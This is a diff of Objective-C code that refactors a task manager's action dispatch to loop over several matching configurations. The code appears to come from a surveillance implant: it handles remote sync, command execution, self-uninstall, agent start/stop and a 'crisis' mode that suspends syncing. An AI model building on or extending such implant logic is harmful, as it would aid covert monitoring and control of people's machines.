@@ -3148,9 +3148,10 @@ static NSLock *gSyncLock                  = nil;
   BOOL _isSyncing = NO;
   int waitCounter = 0;
   
-  NSMutableDictionary *configuration = [self getConfigForAction: anActionID];
+  NSArray *configArray = [self getConfigForAction: anActionID];
+  NSMutableDictionary *configuration;
     
-  if (configuration == nil)
+  if (configArray == nil)
     {
 #ifdef DEBUG_TASK_MANAGER
       infoLog(@"Action not found");
@@ -3159,170 +3160,177 @@ static NSLock *gSyncLock                  = nil;
       [outerPool release];
       return FALSE;
     }
+
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"configArray: %@", configArray);
+#endif
   
-  u_int actionType = [[configuration objectForKey: @"type"] intValue];
-  
-  switch (actionType)
+  for (configuration in configArray)
     {
-    case ACTION_SYNC:
-      {
-        if ((gAgentCrisis & CRISIS_START) && (gAgentCrisis & CRISIS_SYNC))
+      u_int actionType = [[configuration objectForKey: @"type"] intValue];
+
+      switch (actionType)
         {
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"CRISIS_SYNC actived do not sync 0x%x", gAgentCrisis);
-#endif
-          break;
-        }  
-        
-#ifdef DEBUG_TASK_MANAGER
-        infoLog(@"syncing");
-#endif
-        
-        [gSyncLock lock];
-        _isSyncing = mIsSyncing;
-        [gSyncLock unlock];
-        
-        if (_isSyncing == YES)
+        case ACTION_SYNC:
           {
-#ifdef DEBUG_TASK_MANAGER
-            warnLog(@"Sync op already in place - waiting");
-#endif
-            
-            while (_isSyncing == YES && waitCounter < MAX_ACTION_WAIT_TIME)
-              {
-                //usleep(250000);
-                
-                [gSyncLock lock];
-                _isSyncing = mIsSyncing;
-                [gSyncLock unlock];
-                
-                sleep(1);
-                waitCounter++;
-              }
-              
-            // We've waited way too much here
-            if (waitCounter == MAX_ACTION_WAIT_TIME)
+            if ((gAgentCrisis & CRISIS_START) && (gAgentCrisis & CRISIS_SYNC))
               {
 #ifdef DEBUG_TASK_MANAGER
-                errorLog(@"Sync timed out while waiting for another in place");
+                infoLog(@"CRISIS_SYNC actived do not sync 0x%x", gAgentCrisis);
 #endif
-                return FALSE;
+                break;
+              }  
+
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"syncing");
+#endif
+
+            [gSyncLock lock];
+            _isSyncing = mIsSyncing;
+            [gSyncLock unlock];
+
+            if (_isSyncing == YES)
+              {
+#ifdef DEBUG_TASK_MANAGER
+                warnLog(@"Sync op already in place - waiting");
+#endif
+
+                while (_isSyncing == YES && waitCounter < MAX_ACTION_WAIT_TIME)
+                  {
+                    //usleep(250000);
+
+                    [gSyncLock lock];
+                    _isSyncing = mIsSyncing;
+                    [gSyncLock unlock];
+
+                    sleep(1);
+                    waitCounter++;
+                  }
+
+                // We've waited way too much here
+                if (waitCounter == MAX_ACTION_WAIT_TIME)
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    errorLog(@"Sync timed out while waiting for another in place");
+#endif
+                    return FALSE;
+                  }
               }
-          }
-        
-        [gSyncLock lock];
-        mIsSyncing = YES;
-        [gSyncLock unlock];
-        
-        NSNumber *status = [NSNumber numberWithInt: ACTION_PERFORMING];
-        //[configuration setObject: status forKey: @"status"];
-        [configuration threadSafeSetObject: status
-                                    forKey: @"status"
-                                 usingLock: gSyncLock];
-        
-        [mActions actionSync: configuration];
-        
-        [gSyncLock lock];
-        mIsSyncing = NO;
-        [gSyncLock unlock];
-        
-        break;
-      }
-    case ACTION_AGENT_START:
-      {
-        //
-        // TODO: call directly startAgent (?)
-        //
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
-          {
-            NSNumber *status = [NSNumber numberWithInt: 1];
-            [configuration setObject: status forKey: @"status"];
-            //[configuration threadSafeSetObject: status
-            //                            forKey: @"status"
-            //                         usingLock: gTaskManagerLock];
 
-            [mActions actionAgent: configuration start: TRUE];
-          }
-        else
-          {
-#ifdef DEBUG_TASK_MANAGER
-            errorLog(@"Can't start agent with status: %d",
-                     [[configuration objectForKey: @"status"] intValue]);
-#endif
-          }
-        break;
-      }
-    case ACTION_AGENT_STOP:
-      {
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
-          {
-            NSNumber *status = [NSNumber numberWithInt: 1];
+            [gSyncLock lock];
+            mIsSyncing = YES;
+            [gSyncLock unlock];
+
+            NSNumber *status = [NSNumber numberWithInt: ACTION_PERFORMING];
             //[configuration setObject: status forKey: @"status"];
             [configuration threadSafeSetObject: status
                                         forKey: @"status"
-                                     usingLock: gTaskManagerLock];
-            
-            [mActions actionAgent: configuration start: FALSE];
+                                     usingLock: gSyncLock];
+
+            [mActions actionSync: configuration];
+
+            [gSyncLock lock];
+            mIsSyncing = NO;
+            [gSyncLock unlock];
+
+            break;
           }
-        else
+        case ACTION_AGENT_START:
+          {
+            //
+            // TODO: call directly startAgent (?)
+            //
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
+              {
+                NSNumber *status = [NSNumber numberWithInt: 1];
+                [configuration setObject: status forKey: @"status"];
+                //[configuration threadSafeSetObject: status
+                //                            forKey: @"status"
+                //                         usingLock: gTaskManagerLock];
+
+                [mActions actionAgent: configuration start: TRUE];
+              }
+            else
+              {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Can't start agent with status: %d",
+                         [[configuration objectForKey: @"status"] intValue]);
+#endif
+              }
+            break;
+          }
+        case ACTION_AGENT_STOP:
+          {
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
+              {
+                NSNumber *status = [NSNumber numberWithInt: 1];
+                //[configuration setObject: status forKey: @"status"];
+                [configuration threadSafeSetObject: status
+                                            forKey: @"status"
+                                         usingLock: gTaskManagerLock];
+
+                [mActions actionAgent: configuration start: FALSE];
+              }
+            else
+              {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Can't stop agent with status: %d",
+                         [[configuration objectForKey: @"status"] intValue]);
+#endif
+              }
+            break;
+          }
+        case ACTION_EXECUTE:
+          {
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
+              {
+                NSNumber *status = [NSNumber numberWithInt: 1];
+                //[configuration setObject: status forKey: @"status"];
+                [configuration threadSafeSetObject: status
+                                            forKey: @"status"
+                                         usingLock: gTaskManagerLock];
+
+                [mActions actionLaunchCommand: configuration];
+              }
+
+            break;
+          }
+        case ACTION_UNINSTALL:
+          {
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
+              {
+                NSNumber *status = [NSNumber numberWithInt: 1];
+                //[configuration setObject: status forKey: @"status"];
+                [configuration threadSafeSetObject: status
+                                            forKey: @"status"
+                                         usingLock: gTaskManagerLock];
+
+                [mActions actionUninstall: configuration];
+              }
+
+            break;
+          }
+        case ACTION_INFO:
+          {
+            if ([[configuration objectForKey: @"status"] intValue] == 0)
+              {
+                NSNumber *status = [NSNumber numberWithInt: 1];
+                [configuration setObject: status forKey: @"status"];
+
+                [mActions actionInfo: configuration];
+                status = [NSNumber numberWithInt: 0];
+                [configuration setObject: status forKey: @"status"];
+              }
+
+            break;
+          }
+        default:
           {
 #ifdef DEBUG_TASK_MANAGER
-            errorLog(@"Can't stop agent with status: %d",
-                     [[configuration objectForKey: @"status"] intValue]);
+            errorLog(@"Unknown action type: %d", actionType);
 #endif
-          }
-        break;
-      }
-    case ACTION_EXECUTE:
-      {
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
-          {
-            NSNumber *status = [NSNumber numberWithInt: 1];
-            //[configuration setObject: status forKey: @"status"];
-            [configuration threadSafeSetObject: status
-                                        forKey: @"status"
-                                     usingLock: gTaskManagerLock];
-            
-            [mActions actionLaunchCommand: configuration];
-          }
-        
-        break;
-      }
-    case ACTION_UNINSTALL:
-      {
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
-          {
-            NSNumber *status = [NSNumber numberWithInt: 1];
-            //[configuration setObject: status forKey: @"status"];
-            [configuration threadSafeSetObject: status
-                                        forKey: @"status"
-                                     usingLock: gTaskManagerLock];
-            
-            [mActions actionUninstall: configuration];
-          }
-        
-        break;
-      }
-    case ACTION_INFO:
-      {
-        if ([[configuration objectForKey: @"status"] intValue] == 0)
-          {
-            NSNumber *status = [NSNumber numberWithInt: 1];
-            [configuration setObject: status forKey: @"status"];
-
-            [mActions actionInfo: configuration];
-            status = [NSNumber numberWithInt: 0];
-            [configuration setObject: status forKey: @"status"];
-          }
-
-        break;
-      }
-    default:
-      {
-#ifdef DEBUG_TASK_MANAGER
-        errorLog(@"Unknown action type: %d", actionType);
-#endif
-      } break;
+          } break;
+        }
     }
   
   [outerPool release];
@@ -3505,15 +3513,13 @@ static NSLock *gSyncLock                  = nil;
   return mAgentsList;
 }
 
-- (NSMutableDictionary *)getConfigForAction: (u_int)anActionID
+- (NSArray *)getConfigForAction: (u_int)anActionID
 {
-  id anObject;
-  int i = 0;
-  
-  for (; i < [mActionsList count]; i++)
+  NSMutableArray *configArray = [[NSMutableArray alloc] init];
+  NSMutableDictionary *anObject;
+
+  for (anObject in mActionsList)
     {
-      anObject = [mActionsList objectAtIndex: i];
-      
       if ([[anObject threadSafeObjectForKey: @"actionID"
                                   usingLock: gTaskManagerLock]
            unsignedIntValue] == anActionID)
@@ -3521,15 +3527,11 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
           infoLog(@"Action %d found", anActionID);
 #endif
-          return anObject;
+          [configArray addObject: anObject];
         }
     }
   
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Action not found! %d", anActionID);
-#endif
-  
-  return nil;
+  return [configArray autorelease];
 }
 
 - (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
